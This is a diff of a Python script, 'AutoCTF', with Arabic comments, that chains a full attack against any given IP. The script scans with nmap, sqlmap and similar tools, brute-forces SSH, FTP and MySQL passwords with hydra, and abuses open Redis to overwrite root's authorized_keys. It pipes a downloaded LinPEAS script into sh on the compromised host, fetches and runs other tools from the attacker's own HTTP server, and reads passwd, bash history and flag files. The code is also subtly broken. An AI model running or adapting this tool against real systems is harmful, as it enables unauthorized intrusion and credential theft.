@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ==========================================
-# AutoCTF - البحث عن user.flag و root.flag
+# AutoCTF - Kali All-Tools Auto Pentesting Tool
 # ==========================================
 
 import os
@@ -11,7 +11,10 @@ import re
 import json
 import datetime
 import tempfile
+import threading
+from pathlib import Path
 
+# ================= الإعدادات =================
 class Colors:
     HEADER = '\033[95m'
     BLUE = '\033[94m'
@@ -32,278 +35,451 @@ class AutoCTF:
         self.user_flag = None
         self.root_flag = None
         self.log = []
-    
+        self.session_dir = f"session_{target.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
+        os.makedirs(self.session_dir, exist_ok=True)
+        self.log_step(f"بدء جلسة جديدة في {self.session_dir}")
+
+    # ========== الأساسيات ==========
     def log_step(self, message):
         timestamp = datetime.datetime.now().strftime("%H:%M:%S")
-        self.log.append(f"[{timestamp}] {message}")
-        print(f"{Colors.CYAN}[*] {message}{Colors.ENDC}")
-    
-    def run_command(self, cmd):
+        log_msg = f"[{timestamp}] {message}"
+        self.log.append(log_msg)
+        print(f"{Colors.CYAN}[*] {log_msg}{Colors.ENDC}")
+
+    def run_command(self, cmd, timeout=120):
         self.log_step(f"تنفيذ: {cmd}")
         try:
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
             return result.stdout + result.stderr
         except subprocess.TimeoutExpired:
             return "انتهت المهلة"
         except Exception as e:
             return f"خطأ: {e}"
-    
-    def nmap_scan(self):
-        self.log_step("بدء فحص Nmap")
-        output = self.run_command(f"nmap -sC -sV -p- --min-rate=1000 {self.target}")
-        for line in output.splitlines():
-            m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
-            if m:
-                port = m.group(1)
-                service = m.group(2)
-                self.ports.append(port)
-                self.services[port] = service
-        self.log_step(f"المنافذ المفتوحة: {self.ports}")
-        self.log_step(f"الخدمات: {self.services}")
-        return output
-    
-    def web_enum(self):
-        if '80' not in self.services and '443' not in self.services:
-            self.log_step("لا توجد خدمة ويب، تخطي تعداد الدلائل")
-            return
-        port = '80' if '80' in self.services else '443'
-        protocol = 'http' if port == '80' else 'https'
-        url = f"{protocol}://{self.target}"
-        self.log_step(f"بدء تعداد الدلائل على {url}")
-        wordlist = "/usr/share/wordlists/dirb/common.txt"
-        output = self.run_command(f"gobuster dir -u {url} -w {wordlist} -t 50")
-        dirs = re.findall(r'/(\w+)/?\s+\(Status: 200\)', output)
-        self.web_dirs = dirs
-        self.log_step(f"الدلائل المكتشفة: {self.web_dirs}")
-        return output
-    
-    def check_lfi(self):
-        for dir in self.web_dirs:
-            if 'index' in dir or 'admin' in dir or 'include' in dir:
-                self.log_step(f"محاولة LFI في {dir}")
-                test_url = f"http://{self.target}/{dir}/?page=../../../../etc/passwd"
-                out = self.run_command(f"curl -s {test_url}")
-                if "root:" in out:
-                    self.log_step(f"وجدنا LFI في {test_url}")
-                    return test_url
-        return None
-    
-    def check_upload(self):
-        for dir in self.web_dirs:
-            if 'upload' in dir:
-                self.log_step(f"محاولة استغلال رفع ملفات في {dir}")
-                return f"http://{self.target}/{dir}"
-        return None
-    
-    def exploit_web(self):
-        lfi = self.check_lfi()
-        if lfi:
-            # يمكن قراءة ملفات العلم عبر LFI
-            self.log_step("محاولة قراءة user.flag عبر LFI")
-            user_flag_url = f"{lfi}&file=../../../home/user/user.flag"  # افتراض المسار
-            out = self.run_command(f"curl -s {user_flag_url}")
-            if out and "flag" in out:
-                self.user_flag = out.strip()
-                self.log_step(f"وجدنا user.flag: {self.user_flag}")
+
+    def save_output(self, filename, content):
+        with open(f"{self.session_dir}/{filename}", "w") as f:
+            f.write(content)
+
+    # ========== المرحلة 1: الاستطلاع الشامل ==========
+    def recon_all(self):
+        """استخدام أدوات متعددة للاستطلاع"""
+        self.log_step("بدء الاستطلاع الشامل")
+        
+        # 1. Nmap شامل
+        self.log_step("Nmap - فحص جميع المنافذ")
+        nmap_all = self.run_command(f"nmap -p- --min-rate=1000 {self.target}", timeout=300)
+        self.save_output("nmap_all_ports.txt", nmap_all)
+        
+        # استخراج المنافذ المفتوحة
+        open_ports = []
+        for line in nmap_all.splitlines():
+            if "/tcp" in line and "open" in line:
+                port = line.split("/")[0]
+                open_ports.append(port)
+        
+        if open_ports:
+            ports_str = ",".join(open_ports)
+            # 2. Nmap تفصيلي على المنافذ المفتوحة
+            self.log_step("Nmap - فحص تفصيلي للخدمات")
+            nmap_detailed = self.run_command(f"nmap -sC -sV -p{ports_str} {self.target}")
+            self.save_output("nmap_detailed.txt", nmap_detailed)
             
-            root_flag_url = f"{lfi}&file=../../../root/root.flag"
-            out = self.run_command(f"curl -s {root_flag_url}")
-            if out and "flag" in out:
-                self.root_flag = out.strip()
-                self.log_step(f"وجدنا root.flag: {self.root_flag}")
-        upload = self.check_upload()
-        if upload:
-            self.log_step("صفحة رفع ملفات موجودة، يمكن محاولة رفع شيل")
-            # يمكن إضافة كود لرفع شيل آلياً
-    
-    def search_exploit(self, service, version=""):
-        self.log_step(f"البحث عن استغلال لـ {service} {version}")
-        output = self.run_command(f"searchsploit {service} {version}")
-        lines = output.splitlines()
-        exploits = []
-        for line in lines:
-            if 'exploits/' in line:
-                parts = line.split('|')
-                if len(parts) >= 2:
-                    exploits.append(parts[1].strip())
-        if exploits:
-            self.log_step(f"وجدنا استغلالات: {exploits[0]}")
-            return exploits[0]
-        else:
-            return None
-    
-    def try_exploit(self, exploit_name, port):
-        self.log_step(f"محاولة تشغيل الاستغلال {exploit_name} على المنفذ {port}")
-        rc_file = tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False)
-        rc_file.write(f"use {exploit_name}\n")
-        rc_file.write(f"set RHOSTS {self.target}\n")
-        rc_file.write(f"set RPORT {port}\n")
-        rc_file.write("set PAYLOAD generic/shell_reverse_tcp\n")
-        rc_file.write("set LHOST tun0\n")  # يجب تغييرها حسب الواجهة
-        rc_file.write("set LPORT 4444\n")
-        rc_file.write("exploit -j\n")
-        rc_file.close()
-        output = self.run_command(f"msfconsole -q -r {rc_file.name}")
-        os.unlink(rc_file.name)
-        if "Meterpreter session" in output or "Command shell session" in output:
-            self.log_step("الاستغلال نجح!")
-            return True
-        return False
-    
-    def brute_force_ssh(self):
-        if '22' not in self.services:
-            return False
-        self.log_step("بدء هجوم قاموس على SSH")
-        wordlist = "/usr/share/wordlists/rockyou.txt"
-        output = self.run_command(f"hydra -l root -P {wordlist} ssh://{self.target} -t 4 -o hydra_result.txt")
-        with open('hydra_result.txt') as f:
-            data = f.read()
-        m = re.search(r'login:\s+(\S+)\s+password:\s+(\S+)', data)
-        if m:
-            user, pwd = m.groups()
-            self.log_step(f"وجدنا بيانات: {user}:{pwd}")
-            return (user, pwd)
-        return None
-    
-    def get_shell_via_ssh(self, creds):
-        user, pwd = creds
+            # استخراج الخدمات
+            for line in nmap_detailed.splitlines():
+                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
+                if m:
+                    port = m.group(1)
+                    service = m.group(2)
+                    self.ports.append(port)
+                    self.services[port] = service
+        
+        # 3. Masscan سريع (اختياري)
+        if os.path.exists("/usr/bin/masscan"):
+            self.log_step("Masscan - فحص سريع")
+            masscan_out = self.run_command(f"sudo masscan -p1-65535 --rate=1000 {self.target} --output-format grepable -oG {self.session_dir}/masscan.gnmap", timeout=120)
+        
+        # 4. enum4linux لـ SMB
+        if any('netbios' in s or 'microsoft-ds' in s for s in self.services.values()):
+            self.log_step("enum4linux - فحص SMB")
+            enum_out = self.run_command(f"enum4linux -a {self.target}")
+            self.save_output("enum4linux.txt", enum_out)
+        
+        self.log_step(f"الخدمات المكتشفة: {self.services}")
+        return self.services
+
+    # ========== المرحلة 2: تحليل الويب ==========
+    def web_analysis(self, port, protocol="http"):
+        """فحص شامل لخدمات الويب"""
+        url = f"{protocol}://{self.target}:{port}"
+        self.log_step(f"بدء تحليل ويب لـ {url}")
+        
+        # 1. Gobuster / Dirb / Dirsearch
+        wordlist = "/usr/share/wordlists/dirb/common.txt"
+        if os.path.exists("/usr/bin/gobuster"):
+            self.log_step("Gobuster - تعداد الدلائل")
+            gobuster_out = self.run_command(f"gobuster dir -u {url} -w {wordlist} -t 50 -o {self.session_dir}/gobuster_{port}.txt")
+            # استخراج الدلائل
+            dirs = re.findall(r'/(\w+)/?\s+\(Status: 200\)', gobuster_out)
+            self.web_dirs.extend(dirs)
+        
+        # 2. Nikto
+        if os.path.exists("/usr/bin/nikto"):
+            self.log_step("Nikto - فحص الثغرات")
+            nikto_out = self.run_command(f"nikto -h {url} -o {self.session_dir}/nikto_{port}.txt")
+        
+        # 3. WhatWeb
+        if os.path.exists("/usr/bin/whatweb"):
+            self.log_step("WhatWeb - تحديد التقنيات")
+            whatweb_out = self.run_command(f"whatweb {url} > {self.session_dir}/whatweb_{port}.txt")
+        
+        # 4. WPScan إذا كان ووردبريس
+        if "wp-content" in gobuster_out or "wp-admin" in gobuster_out:
+            if os.path.exists("/usr/bin/wpscan"):
+                self.log_step("WPScan - فحص ووردبريس")
+                wpscan_out = self.run_command(f"wpscan --url {url} --enumerate u,vp,vt --api-token YOUR_API_TOKEN > {self.session_dir}/wpscan_{port}.txt")
+        
+        # 5. SQLMap على المعاملات
+        self.log_step("محاولة اكتشاف معاملات SQL")
+        # استخدام waybackurls أو paramspider لجمع URLs
+        if os.path.exists("/usr/bin/waybackurls"):
+            wayback_out = self.run_command(f"waybackurls {self.target} > {self.session_dir}/wayback_urls.txt")
+            if os.path.getsize(f"{self.session_dir}/wayback_urls.txt") > 0:
+                self.log_step("SQLMap - اختبار SQL injection")
+                sqlmap_out = self.run_command(f"sqlmap -m {self.session_dir}/wayback_urls.txt --batch --random-agent --level 2 > {self.session_dir}/sqlmap.txt", timeout=300)
+        
+        # 6. FFUF لاكتشاف المزيد
+        if os.path.exists("/usr/bin/ffuf"):
+            self.log_step("FFUF - fuzzing متقدم")
+            ffuf_out = self.run_command(f"ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ac -o {self.session_dir}/ffuf_{port}.json")
+        
+        self.save_output("web_dirs.txt", "\n".join(self.web_dirs))
+        return self.web_dirs
+
+    # ========== المرحلة 3: استغلال الخدمات ==========
+    def exploit_services(self):
+        """محاولة استغلال جميع الخدمات المكتشفة"""
+        for port, service in self.services.items():
+            self.log_step(f"محاولة استغلال {service} على المنفذ {port}")
+            
+            # SSH
+            if 'ssh' in service:
+                self.exploit_ssh(port)
+            
+            # FTP
+            elif 'ftp' in service:
+                self.exploit_ftp(port)
+            
+            # SMB
+            elif 'microsoft-ds' in service or 'netbios' in service:
+                self.exploit_smb()
+            
+            # MySQL
+            elif 'mysql' in service:
+                self.exploit_mysql(port)
+            
+            # PostgreSQL
+            elif 'postgresql' in service:
+                self.exploit_postgres(port)
+            
+            # Redis
+            elif 'redis' in service:
+                self.exploit_redis(port)
+            
+            # MongoDB
+            elif 'mongodb' in service:
+                self.exploit_mongodb(port)
+            
+            # Oracle
+            elif 'oracle' in service:
+                self.exploit_oracle(port)
+            
+            # HTTP/HTTPS - تم التعامل معه في web_analysis
+            elif 'http' in service:
+                continue
+            
+            # خدمات أخرى - البحث في searchsploit
+            else:
+                self.search_exploit(service, port)
+
+    def exploit_ssh(self, port):
+        """هجمات SSH"""
+        # 1. هجوم قاموس باستخدام hydra
+        if os.path.exists("/usr/bin/hydra"):
+            self.log_step("Hydra - هجوم قاموس على SSH")
+            wordlist = "/usr/share/wordlists/rockyou.txt"
+            hydra_out = self.run_command(f"hydra -l root -P {wordlist} ssh://{self.target}:{port} -t 4 -o {self.session_dir}/hydra_ssh.txt")
+            
+            # تحليل النتائج
+            if os.path.exists(f"{self.session_dir}/hydra_ssh.txt"):
+                with open(f"{self.session_dir}/hydra_ssh.txt") as f:
+                    data = f.read()
+                    m = re.search(r'login:\s+(\S+)\s+password:\s+(\S+)', data)
+                    if m:
+                        user, pwd = m.groups()
+                        self.log_step(f"وجدنا بيانات SSH: {user}:{pwd}")
+                        # محاولة الاتصال
+                        self.get_shell_via_ssh(user, pwd, port)
+        
+        # 2. البحث عن استغلال
+        self.search_exploit("openssh", port)
+
+    def exploit_ftp(self, port):
+        """هجمات FTP"""
+        if os.path.exists("/usr/bin/hydra"):
+            self.log_step("Hydra - هجوم قاموس على FTP")
+            hydra_out = self.run_command(f"hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{self.target}:{port} -t 4 -o {self.session_dir}/hydra_ftp.txt")
+        
+        # محاولة anonymous
+        self.run_command(f"echo 'anonymous\nanonymous\nquit' | ftp {self.target} {port} > {self.session_dir}/ftp_anonymous.txt")
+
+    def exploit_smb(self):
+        """هجمات SMB"""
+        if os.path.exists("/usr/bin/smbclient"):
+            self.log_step("SMBclient - محاولة الاتصال")
+            smb_out = self.run_command(f"smbclient -L //{self.target} -N > {self.session_dir}/smb_shares.txt")
+        
+        if os.path.exists("/usr/bin/enum4linux"):
+            enum_out = self.run_command(f"enum4linux -a {self.target} > {self.session_dir}/enum4linux.txt")
+        
+        if os.path.exists("/usr/bin/smbmap"):
+            smbmap_out = self.run_command(f"smbmap -H {self.target} > {self.session_dir}/smbmap.txt")
+
+    def exploit_mysql(self, port):
+        """هجمات MySQL"""
+        # محاولة كلمات مرور افتراضية
+        if os.path.exists("/usr/bin/mysql"):
+            self.log_step("MySQL - محاولة اتصال")
+            mysql_out = self.run_command(f"mysql -h {self.target} -P {port} -u root -p'' -e 'show databases;' > {self.session_dir}/mysql_root_nopass.txt")
+        
+        # هجوم قاموس
+        if os.path.exists("/usr/bin/hydra"):
+            hydra_out = self.run_command(f"hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{self.target}:{port} -o {self.session_dir}/hydra_mysql.txt")
+
+    def exploit_postgres(self, port):
+        """هجمات PostgreSQL"""
+        if os.path.exists("/usr/bin/psql"):
+            self.log_step("PostgreSQL - محاولة اتصال")
+            pg_out = self.run_command(f"PGPASSWORD='' psql -h {self.target} -p {port} -U postgres -c '\\l' > {self.session_dir}/postgres_nopass.txt")
+
+    def exploit_redis(self, port):
+        """هجمات Redis"""
+        if os.path.exists("/usr/bin/redis-cli"):
+            self.log_step("Redis - محاولة اتصال")
+            redis_out = self.run_command(f"redis-cli -h {self.target} -p {port} info > {self.session_dir}/redis_info.txt")
+            if "redis_version" in redis_out:
+                self.log_step("Redis غير محمي بكلمة مرور")
+                # محاولة كتابة مفتاح SSH
+                self.run_command(f"(echo 'config set dir /root/.ssh'; echo 'config set dbfilename authorized_keys'; echo 'save') | redis-cli -h {self.target} -p {port}")
+
+    def exploit_mongodb(self, port):
+        """هجمات MongoDB"""
+        if os.path.exists("/usr/bin/mongo"):
+            mongo_out = self.run_command(f"echo 'show dbs' | mongo {self.target}:{port} > {self.session_dir}/mongo_dbs.txt")
+
+    def exploit_oracle(self, port):
+        """هجمات Oracle باستخدام ODAT"""
+        if os.path.exists("/usr/bin/odat"):
+            self.log_step("ODAT - فحص Oracle")
+            odat_out = self.run_command(f"odat all -s {self.target} -p {port} > {self.session_dir}/odat.txt")
+
+    def search_exploit(self, service, port):
+        """البحث في searchsploit عن استغلال"""
+        if os.path.exists("/usr/bin/searchsploit"):
+            self.log_step(f"Searchsploit - البحث عن {service}")
+            search_out = self.run_command(f"searchsploit {service} > {self.session_dir}/searchsploit_{service}.txt")
+            
+            # إذا وجد استغلال، محاولة استخدام metasploit
+            if os.path.exists("/usr/bin/msfconsole"):
+                self.log_step("Metasploit - محاولة استغلال تلقائي")
+                # يمكن إضافة منطق أكثر تعقيداً هنا
+
+    # ========== المرحلة 4: الحصول على شيل ==========
+    def get_shell_via_ssh(self, user, password, port):
+        """الاتصال عبر SSH"""
         self.log_step("محاولة الاتصال عبر SSH")
-        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no {user}@{self.target} 'whoami'"
-        output = self.run_command(cmd)
+        # اختبار الاتصال
+        test_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {user}@{self.target} 'whoami'"
+        output = self.run_command(test_cmd)
         if user in output:
             self.log_step("اتصال SSH ناجح")
-            self.shell = f"ssh {user}@{self.target}"
+            self.shell = f"ssh {user}@{self.target} -p {port}"
             return True
         return False
-    
-    def privesc_linux(self):
-        self.log_step("بدء رفع الصلاحيات على لينكس")
-        commands = [
-            "whoami",
-            "id",
-            "uname -a",
+
+    # ========== المرحلة 5: رفع الصلاحيات ==========
+    def privesc_all(self):
+        """رفع الصلاحيات باستخدام أدوات متعددة"""
+        if not self.shell:
+            self.log_step("لا يوجد شيل، تخطي رفع الصلاحيات")
+            return
+        
+        self.log_step("بدء رفع الصلاحيات")
+        
+        # 1. unix-privesc-check
+        if os.path.exists("/usr/bin/unix-privesc-check"):
+            self.log_step("Unix-privesc-check - فحص الإعدادات")
+            # رفع الأداة إلى الجهاز الهدف
+            upc_cmd = f"{self.shell} 'wget -q http://{self.get_local_ip()}:8000/unix-privesc-check -O /tmp/upc && chmod +x /tmp/upc && /tmp/upc standard'"
+            # نحتاج لخادم HTTP محلي
+            threading.Thread(target=self.start_http_server).start()
+            time.sleep(2)
+            upc_out = self.run_command(upc_cmd)
+            self.save_output("unix_privesc_check.txt", upc_out)
+        
+        # 2. LinPEAS
+        self.log_step("LinPEAS - فحص متقدم")
+        linpeas_cmd = f"{self.shell} 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh'"
+        linpeas_out = self.run_command(linpeas_cmd)
+        self.save_output("linpeas.txt", linpeas_out)
+        
+        # 3. Linux Exploit Suggester
+        self.log_step("Linux Exploit Suggester")
+        les_cmd = f"{self.shell} 'wget -q http://{self.get_local_ip()}:8000/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh'"
+        les_out = self.run_command(les_cmd)
+        self.save_output("linux_exploit_suggester.txt", les_out)
+        
+        # 4. جمع معلومات النظام
+        info_commands = [
             "sudo -l",
             "find / -perm -4000 -type f 2>/dev/null",
+            "cat /etc/crontab",
             "cat /etc/passwd",
-            "crontab -l",
-            "ls -la /home",
-            "ls -la /root"
+            "uname -a",
+            "cat /etc/*-release",
+            "ps aux",
+            "netstat -tulpn",
+            "cat ~/.bash_history",
+            "ls -la /home/*/.*",
+            "find / -name '*flag*' 2>/dev/null"
         ]
-        for cmd in commands:
-            if self.shell:
-                full_cmd = f"ssh {self.shell.split()[-1]} '{cmd}'"
-                out = self.run_command(full_cmd)
-                self.log_step(f"نتيجة {cmd}:\n{out[:200]}")
-                if 'sudo' in out and 'NOPASSWD' in out:
-                    self.log_step("يمكن استغلال sudo")
-                if '4000' in out:
-                    self.log_step("لدينا SUID binaries، تحقق من GTFOBins")
-        
-        # محاولة استغلال شائع
-        self.log_step("محاولة استغلال sudoedit (CVE-2021-3156) إذا كان متاحاً")
-        # يمكن تنزيل وتنفيذ استغلال
+        for cmd in info_commands:
+            out = self.run_command(f"{self.shell} '{cmd}'")
+            self.save_output(f"info_{cmd.replace(' ', '_')}.txt", out)
     
-    def search_flags(self):
-        self.log_step("البحث عن user.flag و root.flag")
-        locations = {
-            "user": [
-                "/home/*/user.flag",
-                "/home/*/user.txt",
-                "/home/*/flag.txt",
-                "/home/*/flag",
-                "/var/www/user.flag",
-                "/tmp/user.flag"
-            ],
-            "root": [
-                "/root/root.flag",
-                "/root/root.txt",
-                "/root/flag.txt",
-                "/root/flag",
-                "/root/.flag"
-            ]
-        }
+    def get_local_ip(self):
+        """الحصول على IP المحلي لخادم HTTP"""
+        try:
+            ip = self.run_command("ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'").strip()
+            if not ip:
+                ip = self.run_command("hostname -I | awk '{print $1}'").strip()
+            return ip
+        except:
+            return "127.0.0.1"
+    
+    def start_http_server(self):
+        """تشغيل خادم HTTP لمشاركة الأدوات"""
+        os.chdir(self.session_dir)
+        self.run_command("python3 -m http.server 8000 > /dev/null 2>&1")
+
+    # ========== المرحلة 6: البحث عن العلم ==========
+    def search_all_flags(self):
+        """البحث الشامل عن user.flag و root.flag"""
+        self.log_step("بدء البحث عن الأعلام")
         
         if self.shell:
-            ssh_cmd = f"ssh {self.shell.split()[-1]}"
-            # البحث عن علم المستخدم
-            for loc in locations["user"]:
-                out = self.run_command(f"{ssh_cmd} 'cat {loc}' 2>/dev/null")
-                if out and not "No such file" in out and len(out.strip()) > 0:
-                    self.user_flag = out.strip()
-                    self.log_step(f"وجدنا user.flag في {loc}: {self.user_flag}")
-                    break
+            # أوامر بحث متعددة
+            search_commands = [
+                "find / -name 'user.flag' -type f -exec cat {} \\; 2>/dev/null",
+                "find / -name 'root.flag' -type f -exec cat {} \\; 2>/dev/null",
+                "find / -name '*flag*' -type f -exec cat {} \\; 2>/dev/null | head -5",
+                "cat /root/root.flag 2>/dev/null",
+                "cat /root/root.txt 2>/dev/null",
+                "cat /home/*/user.flag 2>/dev/null",
+                "cat /home/*/user.txt 2>/dev/null",
+                "cat /var/www/html/flag.txt 2>/dev/null",
+                "cat /tmp/flag.txt 2>/dev/null"
+            ]
             
-            # البحث عن علم الجذر
-            for loc in locations["root"]:
-                out = self.run_command(f"{ssh_cmd} 'cat {loc}' 2>/dev/null")
-                if out and not "No such file" in out and len(out.strip()) > 0:
-                    self.root_flag = out.strip()
-                    self.log_step(f"وجدنا root.flag في {loc}: {self.root_flag}")
-                    break
+            for cmd in search_commands:
+                out = self.run_command(f"{self.shell} '{cmd}'")
+                if out and len(out.strip()) > 0 and "No such file" not in out:
+                    if "user.flag" in cmd or "user.txt" in cmd:
+                        self.user_flag = out.strip()
+                        self.log_step(f"وجدنا user.flag: {self.user_flag}")
+                    elif "root.flag" in cmd or "root.txt" in cmd:
+                        self.root_flag = out.strip()
+                        self.log_step(f"وجدنا root.flag: {self.root_flag}")
+                    else:
+                        self.log_step(f"وجدنا ملف علم محتمل: {out[:100]}")
         else:
             self.log_step("لا يوجد شيل، تخطي البحث عن الأعلام")
-    
+
+    # ========== التشغيل الرئيسي ==========
     def run(self):
-        self.log_step("بدء الهجوم التلقائي على " + self.target)
+        """تشغيل جميع المراحل بالتسلسل"""
+        self.log_step(f"بدء الهجوم التلقائي على {self.target}")
         
-        # 1. فحص Nmap
-        self.nmap_scan()
+        # المرحلة 1: الاستطلاع
+        self.recon_all()
         
-        # 2. إذا كان ويب، تعداد دلائل واستغلال
-        if '80' in self.services or '443' in self.services:
-            self.web_enum()
-            self.exploit_web()
-        
-        # 3. محاولة استغلال الخدمات الأخرى
+        # المرحلة 2: تحليل الويب
         for port, service in self.services.items():
-            if service == 'ssh':
-                creds = self.brute_force_ssh()
-                if creds:
-                    if self.get_shell_via_ssh(creds):
-                        break
-                else:
-                    exploit = self.search_exploit('openssh')
-                    if exploit:
-                        if self.try_exploit(exploit, port):
-                            break
-            elif service in ['ftp', 'smb']:
-                # محاولة anonymous
-                pass
-            elif service in ['http', 'https']:
-                continue
-            else:
-                exploit = self.search_exploit(service)
-                if exploit:
-                    self.try_exploit(exploit, port)
+            if 'http' in service or 'https' in service:
+                protocol = 'https' if 'https' in service else 'http'
+                self.web_analysis(port, protocol)
         
-        # 4. إذا حصلنا على شيل، نبدأ رفع الصلاحيات والبحث عن الأعلام
+        # المرحلة 3: استغلال الخدمات
+        self.exploit_services()
+        
+        # إذا لم نحصل على شيل من الخدمات، حاول هجمات إضافية
+        if not self.shell:
+            self.log_step("محاولة هجمات إضافية...")
+            # يمكن إضافة المزيد هنا
+        
+        # المرحلة 4: رفع الصلاحيات والبحث عن العلم
         if self.shell:
-            self.privesc_linux()
-            self.search_flags()
-        else:
-            self.log_step("لم نتمكن من الحصول على شيل.")
+            self.privesc_all()
+            self.search_all_flags()
         
-        # 5. عرض النتائج
-        print(f"\n{Colors.GREEN}{Colors.BOLD}=== النتائج النهائية ==={Colors.ENDC}")
+        # عرض النتائج النهائية
+        self.show_results()
+    
+    def show_results(self):
+        """عرض النتائج النهائية"""
+        print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}{Colors.ENDC}")
+        print(f"{Colors.GREEN}{Colors.BOLD}=== النتائج النهائية ==={Colors.ENDC}")
+        print(f"{Colors.GREEN}{Colors.BOLD}{'='*60}{Colors.ENDC}")
+        
+        print(f"{Colors.BOLD}الهدف:{Colors.ENDC} {self.target}")
+        print(f"{Colors.BOLD}المنافذ المفتوحة:{Colors.ENDC} {', '.join(self.ports) if self.ports else 'لا شيء'}")
+        print(f"{Colors.BOLD}الخدمات:{Colors.ENDC}")
+        for port, service in self.services.items():
+            print(f"  - {port}: {service}")
+        
+        print(f"\n{Colors.BOLD}الدلائل المكتشفة:{Colors.ENDC}")
+        for d in self.web_dirs[:10]:
+            print(f"  - {d}")
+        
+        print(f"\n{Colors.BOLD}الأعلام:{Colors.ENDC}")
         if self.user_flag:
-            print(f"{Colors.BOLD}user.flag: {self.user_flag}{Colors.ENDC}")
+            print(f"  {Colors.GREEN}user.flag: {self.user_flag}{Colors.ENDC}")
         else:
-            print("لم نعثر على user.flag.")
+            print(f"  {Colors.FAIL}user.flag: غير موجود{Colors.ENDC}")
         
         if self.root_flag:
-            print(f"{Colors.BOLD}root.flag: {self.root_flag}{Colors.ENDC}")
+            print(f"  {Colors.GREEN}root.flag: {self.root_flag}{Colors.ENDC}")
         else:
-            print("لم نعثر على root.flag.")
+            print(f"  {Colors.FAIL}root.flag: غير موجود{Colors.ENDC}")
         
-        # حفظ السجل
-        with open("autoctf_log.txt", "w") as f:
-            f.write("\n".join(self.log))
-        print(f"{Colors.CYAN}تم حفظ السجل في autoctf_log.txt{Colors.ENDC}")
+        print(f"\n{Colors.CYAN}تم حفظ جميع المخرجات في: {self.session_dir}{Colors.ENDC}")
 
+# ========== نقطة الدخول ==========
 if __name__ == "__main__":
+    # التحقق من وجود الأدوات الأساسية
+    required_tools = ['nmap', 'gobuster', 'hydra', 'searchsploit']
+    missing = []
+    for tool in required_tools:
+        if not os.path.exists(f"/usr/bin/{tool}") and not os.path.exists(f"/usr/sbin/{tool}"):
+            missing.append(tool)
+    
+    if missing:
+        print(f"{Colors.WARNING}تحذير: بعض الأدوات غير موجودة: {', '.join(missing)}{Colors.ENDC}")
+        print("قد لا تعمل بعض الوظائف بشكل كامل.")
+    
     if len(sys.argv) < 2:
-        print("استخدام: python3 autoctf.py <target_ip>")
+        print(f"استخدام: {sys.argv[0]} <target_ip>")
         sys.exit(1)
+    
     target = sys.argv[1]
     agent = AutoCTF(target)
     agent.run()
